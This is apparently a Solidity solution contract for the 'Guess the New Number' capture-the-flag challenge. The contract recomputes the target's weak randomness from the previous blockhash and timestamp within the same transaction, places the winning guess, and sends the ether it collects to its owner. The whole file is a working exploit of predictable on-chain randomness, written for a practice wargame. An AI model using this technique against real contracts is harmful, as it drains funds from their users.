// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);

    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberChallengeAttacker {
    IGuessTheNewNumberChallenge public challenge;
    address payable public owner;

    constructor(address challengeAddress) {
        challenge = IGuessTheNewNumberChallenge(challengeAddress);
        owner = msg.sender;
    }

    function exploit() external payable {
        require(
            address(this).balance >= 1 ether,
            "You do not have enough ether"
        );

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        challenge.guess{value: 1 ether}(answer);
        // 2 ether will be sent to this contract after guess function is called
        // we need to send balance back to our EOA
        require(challenge.isComplete(), "Challenge is not completed");

        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}
